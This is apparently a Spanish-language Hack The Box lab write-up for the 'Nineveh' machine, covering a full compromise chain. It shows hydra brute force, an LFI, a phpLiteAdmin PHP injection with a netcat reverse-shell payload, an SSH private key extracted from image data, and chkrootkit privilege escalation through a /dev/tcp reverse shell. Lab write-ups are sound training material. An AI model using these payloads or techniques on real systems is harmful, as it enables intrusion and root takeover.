---
tags:
title: Nineveh- Medium (HTB)
permalink: /Nineveh-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Introduccion

# Reconocimiento

```bash
nmap -sCV -p80,443 10.129.254.62                                       
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-04 14:36 -03
Nmap scan report for 10.129.254.62
Host is up (0.56s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
|_http-title: Site doesn't have a title (text/html).
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.48 seconds
```

## Website / Port 80 

La pagina que corre en el puerto `80` no muestra nada de nada, solo un mensaje, y nada de informaci贸n en el c贸digo fuente.

![image-center](/assets/images/{CD08ECDC-8ABE-4DA4-BB34-C2398071241A}.png)

### Feroxbuster 

```bash
feroxbuster -u http://nineveh.htb -x php,asp,aspx
<SNIP>>
	200      GET        5l       25w      178c http://nineveh.htb/
200      GET      977l     5005w    83675c http://nineveh.htb/info.php
404      GET        9l       33w      287c http://nineveh.htb/Reports%20List
404      GET        9l       33w      291c http://nineveh.htb/Reports%20List.php
404      GET        9l       33w      293c http://nineveh.htb/external%20files.php
404      GET        9l       33w      293c http://nineveh.htb/external%20files.asp
404      GET        9l       33w      294c http://nineveh.htb/external%20files.aspx
404      GET        9l       33w      285c http://nineveh.htb/modern%20mom
404      GET        9l       33w      289c http://nineveh.htb/modern%20mom.php
404      GET        9l       33w      290c http://nineveh.htb/modern%20mom.aspx
404      GET        9l       34w      295c http://nineveh.htb/neuf%20giga%20photo.aspx
301      GET        9l       28w      315c http://nineveh.htb/department => http://nineveh.htb/department/
301      GET        9l       28w      319c http://nineveh.htb/department/css => http://nineveh.htb/department/css/
200      GET       57l      109w     1560c http://nineveh.htb/department/login.php
301      GET        9l       28w      321c http://nineveh.htb/department/files => http://nineveh.htb/department/files/
200      GET     4656l     9502w    81933c http://nineveh.htb/department/css/bootstrap.css
302      GET        0l        0w        0c http://nineveh.htb/department/logout.php => login.php
200      GET        4l        7w       57c http://nineveh.htb/department/css/nineveh.css
200      GET        1l        3w       68c http://nineveh.htb/department/index.php
302      GET        0l        0w        0c http://nineveh.htb/department/manage.php => login.php
200      GET        1l        3w       68c http://nineveh.htb/department/files/index.php
200      GET        1l        3w       68c http://nineveh.htb/department/css/index.php
200      GET       21l       40w      670c http://nineveh.htb/department/header.php
200      GET        7l        4w       51c http://nineveh.htb/department/footer.php
404      GET        9l       33w      304c http://nineveh.htb/department/files/Reports%20List
404      GET        9l       33w      306c http://nineveh.htb/department/files/external%20files
404      GET        9l       33w      311c http://nineveh.htb/department/files/external%20files.aspx
404      GET        9l       33w      301c http://nineveh.htb/department/modern%20mom.aspx
404      GET        9l       34w      305c http://nineveh.htb/department/neuf%20giga%20photo.asp
404      GET        9l       34w      306c http://nineveh.htb/department/neuf%20giga%20photo.aspx
404      GET        9l       34w      305c http://nineveh.htb/department/css/neuf%20giga%20photo
404      GET        9l       34w      309c http://nineveh.htb/department/css/neuf%20giga%20photo.php
404      GET        9l       33w      302c http://nineveh.htb/department/files/modern%20mom
404      GET        9l       34w      307c http://nineveh.htb/department/files/neuf%20giga%20photo
404      GET        9l       33w      307c http://nineveh.htb/department/files/modern%20mom.aspx
404      GET        9l       34w      311c http://nineveh.htb/department/files/neuf%20giga%20photo.asp
404      GET        9l       33w      289c http://nineveh.htb/Contact%20Us.asp
[######>-------------] - 11m   159208/480068  16m     found:37      errors:4252   
 Caught ctrl+c  saving scan state to ferox-http_nineveh_htb_-1764870590.state ...
[######>-------------] - 11m   159349/480068  16m     found:37      errors:4252   
[##########>---------] - 11m    63308/120000  95/s    http://nineveh.htb/ 
[######>-------------] - 7m     36288/120000  87/s    http://nineveh.htb/department/ 
[######>-------------] - 7m     36040/120000  87/s    http://nineveh.htb/department/css/ 
[#####>--------------] - 7m     34880/120000  84/s    http://nineveh.htb/department/files/ 
[--------------------] - 0s         0/120000  -       http://nineveh.htb/department/login.php 
[--------------------] - 0s         0/120000  -       http://nineveh.htb/department/css/bootstrap.css 
```
### PHPinfo

En el escaneo de `feroxbuster` me revelo el archivo `info.php` en cual es el archivo `phpinfo`. En el mismo puedo ver las funciones deshabilitadas, de las cuales no estan las que puedo usar generalmente como `exec()`, `system()`, etc.

![image-center](/assets/images/{D93EADB7-C38A-4E8C-82CE-B2A28831FE43}.png)

### Login.php

Ademas en la ruta `department/` veo un panel de login.

![image-center](/assets/images/{2B5C7F1A-A22E-4B80-A65D-E6D2C093D123}.png)

Probando inyecciones `SQL` no tengo exito, pero sin embargo en el codigo fuente tengo informacion.

```html
<!-- @admin! MySQL is been installed.. please fix the login page! ~amrois -->
```

Esto no me es de mucha utilidad. Igualmente si uso credenciales invalidas me pone el siguiente mensaje.

![image-center](/assets/images/{01C09A6C-C8B7-40A0-B25C-91B9423F6997}.png)

Pero probando por el usuario `admin` y una password cualquiera, el mensaje de error cambia.

![image-center](/assets/images/{253E35C3-7221-4C2F-970A-EF1F9D865EA5}.png)

### Hydra bruteforce

Podria usar `hydra` para hacer fuerza bruta por el usuario `admin` y que coincida con alguna password del `rockyou`.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.129.254.62 http-post-form '/department/login.php:username=^USER^&password=^PASS^:Invalid Password!'
<SNIP>
[80][http-post-form] host: 10.129.254.62   login: admin   password: 1q2w3e4r5t
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-04 15:43:51
```

## LFI 

![image-center](/assets/images/{CA94C4A9-4A83-450C-BC34-B7B43219DBB1}.png)

Si me voy a la seccion de `notes` veo el siguiente mensaje debajo de la imagen.

![image-center](/assets/images/{183BBF76-A213-42C9-9A90-EAE4959E367A}.png)

Ademas en la url se usa un parametro `notes` para indicarle un archivo a leer al parecer.

```bash
http://nineveh.htb/department/manage.php?notes=files/ninevehNotes.txt
```

Aca ya podria pensar en un `LFI` para poder ver archivos del sistema. Sin embargo no hay validacion por parte de payload como `../` pero al parecer no logro ver archivos del sistema. Ademas es de notar que solo puedo visualizar archivo que contengan el siguiente nombre : `ninevehNotes`
## Website / Port 443 SSL

Por `ssl` veo una imagen solamente.

![image-center](/assets/images/{A77C353D-384E-43DD-832A-83728E24F3FA}.png)

### Metadata

Al descargarme la imagen y con la herramienta `exiftool` ver los metadatos, veo que esta hecha por un `Software` llamado `Shutter`.

```bash
exiftool ninevehForAll.png                                    
ExifTool Version Number         : 13.36
File Name                       : ninevehForAll.png
Directory                       : .
File Size                       : 561 kB
File Modification Date/Time     : 2025:12:04 14:41:49-03:00
File Access Date/Time           : 2025:12:04 14:41:49-03:00
File Inode Change Date/Time     : 2025:12:04 14:41:50-03:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1336
Image Height                    : 508
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Image Size                      : 1336x508
Megapixels                      : 0.679
```

Nada util por ahora..
## Private key
### Gobuster enumeration

```bash
gobuster dir -k -u https://nineveh.htb -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o scans/gobuster-https-root-medium -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.43
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/04/11 05:10:49 Starting gobuster
===============================================================
/db (Status: 301)
/server-status (Status: 403)
/secure_notes (Status: 301)
===============================================================
2020/04/11 05:13:54 Finished
===============================================================
```

Veo 3 directorios, `/db` me lleva al panel de login que muestro mas adelante y `/secure_notes` a la siguiente imagen.

![image-center](/assets/images/{6402A87F-9166-4695-A399-62B9E2BC87F7}.png)

Si analizo nuevamente con `exiftools` veo que ademas tiene datos ocultos.

```bash
 exiftool nineveh.png 
ExifTool Version Number         : 13.36
File Name                       : nineveh.png
Directory                       : .
File Size                       : 2.9 MB
File Modification Date/Time     : 2025:12:04 16:31:59-03:00
File Access Date/Time           : 2025:12:04 16:31:59-03:00
File Inode Change Date/Time     : 2025:12:04 16:31:59-03:00
File Permissions                : -rw-rw-r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 1497
Image Height                    : 746
Bit Depth                       : 8
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Significant Bits                : 8 8 8
Software                        : Shutter
Warning                         : [minor] Trailer data after PNG IEND chunk
Image Size                      : 1497x746
Megapixels                      : 1.1
```

Por lo que puedo verlo con strings.

```bash
strings nineveh.png | tail -100
<SNIP>
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAri9EUD7bwqbmEsEpIeTr2KGP/wk8YAR0Z4mmvHNJ3UfsAhpI
H9/Bz1abFbrt16vH6/jd8m0urg/Em7d/FJncpPiIH81JbJ0pyTBvIAGNK7PhaQXU
PdT9y0xEEH0apbJkuknP4FH5Zrq0nhoDTa2WxXDcSS1ndt/M8r+eTHx1bVznlBG5
FQq1/wmB65c8bds5tETlacr/15Ofv1A2j+vIdggxNgm8A34xZiP/WV7+7mhgvcnI
3oqwvxCI+VGhQZhoV9Pdj4+D4l023Ub9KyGm40tinCXePsMdY4KOLTR/z+oj4sQT
X+/1/xcl61LADcYk0Sw42bOb+yBEyc1TTq1NEQIDAQABAoIBAFvDbvvPgbr0bjTn
KiI/FbjUtKWpWfNDpYd+TybsnbdD0qPw8JpKKTJv79fs2KxMRVCdlV/IAVWV3QAk
FYDm5gTLIfuPDOV5jq/9Ii38Y0DozRGlDoFcmi/mB92f6s/sQYCarjcBOKDUL58z
GRZtIwb1RDgRAXbwxGoGZQDqeHqaHciGFOugKQJmupo5hXOkfMg/G+Ic0Ij45uoR
JZecF3lx0kx0Ay85DcBkoYRiyn+nNgr/APJBXe9Ibkq4j0lj29V5dT/HSoF17VWo
9odiTBWwwzPVv0i/JEGc6sXUD0mXevoQIA9SkZ2OJXO8JoaQcRz628dOdukG6Utu
Bato3bkCgYEA5w2Hfp2Ayol24bDejSDj1Rjk6REn5D8TuELQ0cffPujZ4szXW5Kb
ujOUscFgZf2P+70UnaceCCAPNYmsaSVSCM0KCJQt5klY2DLWNUaCU3OEpREIWkyl
1tXMOZ/T5fV8RQAZrj1BMxl+/UiV0IIbgF07sPqSA/uNXwx2cLCkhucCgYEAwP3b
vCMuW7qAc9K1Amz3+6dfa9bngtMjpr+wb+IP5UKMuh1mwcHWKjFIF8zI8CY0Iakx
DdhOa4x+0MQEtKXtgaADuHh+NGCltTLLckfEAMNGQHfBgWgBRS8EjXJ4e55hFV89
P+6+1FXXA1r/Dt/zIYN3Vtgo28mNNyK7rCr/pUcCgYEAgHMDCp7hRLfbQWkksGzC
fGuUhwWkmb1/ZwauNJHbSIwG5ZFfgGcm8ANQ/Ok2gDzQ2PCrD2Iizf2UtvzMvr+i
tYXXuCE4yzenjrnkYEXMmjw0V9f6PskxwRemq7pxAPzSk0GVBUrEfnYEJSc/MmXC
iEBMuPz0RAaK93ZkOg3Zya0CgYBYbPhdP5FiHhX0+7pMHjmRaKLj+lehLbTMFlB1
MxMtbEymigonBPVn56Ssovv+bMK+GZOMUGu+A2WnqeiuDMjB99s8jpjkztOeLmPh
PNilsNNjfnt/G3RZiq1/Uc+6dFrvO/AIdw+goqQduXfcDOiNlnr7o5c0/Shi9tse
i6UOyQKBgCgvck5Z1iLrY1qO5iZ3uVr4pqXHyG8ThrsTffkSVrBKHTmsXgtRhHoc
il6RYzQV/2ULgUBfAwdZDNtGxbu5oIUB938TCaLsHFDK6mSTbvB/DywYYScAWwF7
fw4LVXdQMjNJC3sn3JaqY1zJkE4jXlZeNQvCx4ZadtdJD9iO+EUG
-----END RSA PRIVATE KEY-----
secret/nineveh.pub
0000644
0000041
0000041
00000000620
13126060277
014541
ustar  
www-data
www-data
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL0RQPtvCpuYSwSkh5OvYoY//CTxgBHRniaa8c0ndR+wCGkgf38HPVpsVuu3Xq8fr+N3ybS6uD8Sbt38Umdyk+IgfzUlsnSnJMG8gAY0rs+FpBdQ91P3LTEQQfRqlsmS6Sc/gUflmurSeGgNNrZbFcNxJLWd238zyv55MfHVtXOeUEbkVCrX/CYHrlzxt2zm0ROVpyv/Xk5+/UDaP68h2CDE2CbwDfjFmI/9ZXv7uaGC9ycjeirC/EIj5UaFBmGhX092Pj4PiXTbdRv0rIabjS2KcJd4+wx1jgo4tNH/P6iPixBNf7/X/FyXrUsANxiTRLDjZs5v7IETJzVNOrU0R amrois@nineveh.htb
```

Al parecer es una clave `RSA` para el usuario `amrois`, pero por ahora no me es de utilidad debido a que el puerto `ssh` no esta expuesto.
### PHPLiteAdmin

El escaneo ahora pero por `ssl` me revelo la ruta `/db` con un index. El mismo tiene el nombre del servicio que corre el cual es `phpLiteAdmin` con la version `v1.9`.

![image-center](/assets/images/{E25562B5-0B55-48E0-8237-EE28342F7BC5}.png)

Como tengo las creds de admin, en este panel no son validas pero puedo volver a usar `hydra` para descubrir la pass.

```bash
hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt 10.129.254.62 https-post-form "/db/index.php :password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect password." -V -t 40
<SNIP>
[443][http-post-form] host: 10.129.254.62   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-12-04 16:06:15
```

Ahora que tengo la pass me logueo.

![image-center](/assets/images/{0DD07E9E-E569-4115-B704-4F226BF14FF2}.png)
## Shell as www-data
### Exploit

Si busco en la base de datos de `metasploit` encuentro lo siguiente.

```bash
searchsploit phpLite
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
phpLiteAdmin - 'table' SQL Injection                                                                                                                     | php/webapps/38228.txt
phpLiteAdmin 1.1 - Multiple Vulnerabilities                                                                                                              | php/webapps/37515.txt
PHPLiteAdmin 1.9.3 - Remote PHP Code Injection                                                                                                           | php/webapps/24044.txt
phpLiteAdmin 1.9.6 - Multiple Vulnerabilities                                                                                                            | php/webapps/39714.txt
phpLiterAdmin 1.0 RC1 - Authentication Bypass                                                                                                            | php/webapps/15322.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Al parecer hay un poc para obtener Inyecci贸n de comandos `PHP`, en la version `1.9.3`, pero podria analizar de que se trata.

```bash
Description:

phpliteadmin.php#1784: 'Creating a New Database' =>
phpliteadmin.php#1785: 'When you create a new database, the name you entered will be appended with the appropriate file extension (.db, .db3, .sqlite, etc.) if you do not include it yourself. The database will be created in the directory you specified as the $directory variable.',

An Attacker can create a sqlite Database with a php extension and insert PHP Code as text fields. When done the Attacker can execute it simply by access the database file with the Webbrowser.

Proof of Concept:

1. We create a db named "hack.php".
(Depending on Server configuration sometimes it will not work and the name for the db will be "hack.sqlite". Then simply try to rename the database / existing database to "hack.php".)
The script will store the sqlite database in the same directory as phpliteadmin.php.
Preview: http://goo.gl/B5n9O
Hex preview: http://goo.gl/lJ5iQ

2. Now create a new table in this database and insert a text field with the default value:
<?php phpinfo()?>
Hex preview: http://goo.gl/v7USQ

3. Now we run hack.php

Done!

Proof: http://goo.gl/ZqPVL
```

Veo que en `PoC` me dice de crear un base de datos y luego insertar en una tabla el siguiente `payload` de prueba .

```php
<?php phpinfo()?>
```

Y ademas a la base de datos la tengo q nombrar como `ninevehNotes.php` ya que la inyecci贸n es de c贸digo `php`.

![image-center](/assets/images/{68609162-4F85-4747-BA2C-B522B950F053}.png)

Ahora aprovech谩ndome el `LFI` sabiendo que estoy en la ruta `/var/www/department/` tengo que retroceder 2 directorios para poder ver el archivo que cree, ya que como puedo ver se creo en la ruta `/var/tmp`.

![image-center](/assets/images/{F35CD91A-FD05-47DF-BAD0-3CF004C5F4E7}.png)

Ahora desde la url..

![image-center](/assets/images/{8831F9B4-BDD3-4A58-A4FC-4B8DE0E9DA1D}.png)

Y como tengo inyecci贸n de comando puedo usar el siguiente `payload`.

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.19 4444 >/tmp/f"); ?>
```

As铆 que creo una nueva tabla .

![image-center](/assets/images/{19F73634-0B1E-4F45-88DE-A60D9BBA7CA6}.png)

Y coloco ese valor, para despu茅s acceder al archivo desde el `LFI`.
## Shell as amrois

Y desde mi listener `nc` recibo la shell como `www-data`

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.254.62] 37624
bash: cannot set terminal process group (1416): Inappropriate ioctl for device
bash: no job control in this shell
www-data@nineveh:/var/www/html/department$ whoami
whoami
www-data
```

Como tenia la clave `rsa` de `amrois` puedo crearla en el directorio `/tmp` y darle permisos de lectura para desde internamente loguearme como el con `ssh`.

```bash
www-data@nineveh:/tmp$ chmod 600 id_rsa 
www-data@nineveh:/tmp$ ssh amrois@127.0.0.1 -i id_rsa 
Could not create directory '/var/www/.ssh'.
The authenticity of host '127.0.0.1 (127.0.0.1)' can''t be established.
ECDSA key fingerprint is SHA256:aWXPsULnr55BcRUl/zX0n4gfJy5fg29KkuvnADFyMvk.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
Ubuntu 16.04.2 LTS
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

288 packages can be updated.
207 updates are security updates.


You have mail.
Last login: Mon Jul  3 00:19:59 2017 from 192.168.0.14
amrois@nineveh:~$
```

```bash
amrois@nineveh:~$ cat user.txt 
8489f2efacbb31629466d5418335b3de
```

## Shell as root

### Enumeration

En el directorio `/report` hay varios archivos `.txt`.

```bash
amrois@nineveh:/report$ cat report-25-12-04:13:46.txt
ROOTDIR is `/'
<SNIP>
/lib/modules/4.4.0-62-generic/vdso/.build-id
Searching for LPD Worm files and dirs... nothing found
Searching for Ramen Worm files and dirs... nothing found

/var/tmp/hack.php
/var/tmp/ninevehNotes.php

Searching for anomalies in shell history files... Warning: `//root/.bash_history' is linked to another file
Checking `asp'... not infected
Checking `bindshell'... not infected
Checking `lkm'... not tested: can't exec 
Checking `rexedcs'... not found
Checking `sniffer'... not tested: can't exec ./ifpromisc
Checking `w55808'... not infected
Checking `wted'... not tested: can't exec ./chkwtmp
Checking `scalper'... not infected
Checking `slapper'... not infected
Checking `z2'... not tested: can't exec ./chklastlog
Checking `chkutmp'... not tested: can't exec ./chkutmp
Checking `OSX_RSPLUG'... not infected
```

Dentro de cada uno, parece haber como una especie de log de archivos o binarios del sistema. Como si una especie de binario este chequeando la integridad de cada uno corroborando que ninguno este infectado pareciera ser.
### pspy

As铆 que decid铆 subir `pspy` para monitorear procesos en tiempo real y es as铆 como veo muchos procesos de un binario llamado `chrootkit`.

```bash
<SNIP>
2025/12/04 14:05:01 CMD: UID=0     PID=13697  | /bin/sh /usr/bin/chkrootkit 
2025/12/04 14:05:01 CMD: UID=0     PID=13700  | /bin/echo -n Checking `find...  
2025/12/04 14:05:01 CMD: UID=0     PID=13703  | /bin/sh /bin/egrep /dev/ttyof|/dev/pty[pqrs]|^/prof|/home/virus|/security|file\.h 
2025/12/04 14:05:01 CMD: UID=0     PID=13702  | /bin/sh /usr/bin/chkrootkit 
2025/12/04 14:05:01 CMD: UID=0     PID=13705  | /bin/sh /usr/bin/chkrootkit 
2025/12/04 14:05:01 CMD: UID=0     PID=13704  | /bin/sh /usr/bin/chkrootkit
<SNIP>
```

Es algo raro, as铆 que puedo buscar por `exploits` en la misma base de datos que busque al inicio.

```bash
searchsploit chkrootkit
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Chkrootkit - Local Privilege Escalation (Metasploit)                                                                                                     | linux/local/38775.rb
Chkrootkit 0.49 - Local Privilege Escalation                                                                                                             | linux/local/33899.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
### Analizing poc

Veo dos, analizo el `txt`.

```bash
We just found a serious vulnerability in the chkrootkit package, which
may allow local attackers to gain root access to a box in certain
configurations (/tmp not mounted noexec).

The vulnerability is located in the function slapper() in the
shellscript chkrootkit:

#
# SLAPPER.{A,B,C,D} and the multi-platform variant
#
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=

   if ${netstat} "${OPT}"|${egrep} "^tcp"|${egrep} "${SLAPPER_PORT}">
/dev/null 2>&1
      then
      STATUS=1
      [ "$SYSTEM" = "Linux" ] && file_port=`netstat -p ${OPT} | \
         $egrep ^tcp|$egrep "${SLAPPER_PORT}" | ${awk} '{ print  $7 }' |
tr -d :`
   fi
   for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
   done
   if [ ${STATUS} -eq 1 ] ;then
      echo "Warning: Possible Slapper Worm installed ($file_port)"
   else
      if [ "${QUIET}" != "t" ]; then echo "not infected"; fi
         return ${NOT_INFECTED}
   fi
}

```
### Vuln

Al parecer como dice en el mismo script la vulnerabilidad reside en la funci贸n `slapper()` del binario de `chrootkit`.

```bash
for i in ${SLAPPER_FILES}; do
      if [ -f ${i} ]; then
         file_port=$file_port $i
         STATUS=1
      fi
```

Ya que como menciona en el mismo la linea.

```bash
file_port=$file_port $i
```

Ejecuta cada archivo especificado en `$SLAPPER_FILES` como el usuario que este ejecutando `chrootkit`, que en mi caso es `root`.

Ya que en en esa variable esta mal sanitizada al no haber una simple comillas dobles `("")` haciendo que el script tome a `$i` como un comando y no como una cadena `(string)`.

```bash
slapper (){
   SLAPPER_FILES="${ROOTDIR}tmp/.bugtraq ${ROOTDIR}tmp/.bugtraq.c"
   SLAPPER_FILES="$SLAPPER_FILES ${ROOTDIR}tmp/.unlock ${ROOTDIR}tmp/httpd \
   ${ROOTDIR}tmp/update ${ROOTDIR}tmp/.cinik ${ROOTDIR}tmp/.b"a
   SLAPPER_PORT="0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 "
   OPT=-an
   STATUS=0
   file_port=
```

Es as铆 como en el mismo `poc` me dice que el binario busca los archivos como `/tmp/update/` entre otros, siendo as铆 este el que yo voy a crear con el siguiente contenido.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.17.19/4444 0>&1
```

Y le doy permisos de ejecuci贸n, para as铆 lograr la explotaci贸n.

```bash
chmod +x update
```

Y si espero unos segundos, ya que es un proceso que esta constantemente en ejecuci贸n, desde mi listener `nc` recibo la shell como `root`.

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.254.62] 37648
bash: cannot set terminal process group (25189): Inappropriate ioctl for device
bash: no job control in this shell
root@nineveh:~# whoami
whoami
root
```

```bash
root@nineveh:~# cat /root/root.txt
cat /root/root.txt
93c2f1283d222ee621a6414e211fc8eb
```

`~Happy Hacking.`







